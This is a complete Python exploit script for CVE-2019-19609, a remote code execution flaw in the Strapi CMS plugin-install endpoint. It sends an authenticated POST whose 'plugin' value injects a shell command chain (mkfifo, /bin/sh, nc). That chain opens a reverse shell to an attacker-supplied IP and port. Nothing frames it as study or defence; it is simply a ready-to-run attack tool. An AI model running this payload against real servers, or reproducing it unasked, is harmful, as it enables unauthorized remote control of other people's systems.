#!/usr/bin/env python3
#CVE-2019-19609 strapi <= 3.0.0-beta.17.8 authenticated remote code execution

import requests, sys, json
from requests.compat import urljoin
  
if len(sys.argv) <= 4:
    print("Uso: python" + sys.argv[0] + "<url> <token> <rev ip>  <rev port>")
    sys.exit()  
  
url = sys.argv[1]
token = sys.argv[2]  
  

payload = {'plugin':'documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f)'.format(sys.argv[3], sys.argv[4]),
           'port':'80'}

headers =  {
    'Authorization': 'Bearer {}'.format(token),
    'Content-Type': 'application/json',
    'Origin': '{}'.format(url),
    'Content-Length': '123',
    'Connection': 'close'}

print("[!] Launching ")

r = requests.post(url = urljoin(url,'/admin/plugins/install'), data = json.dumps(payload), headers = headers)
  

response = r.text
print (response)
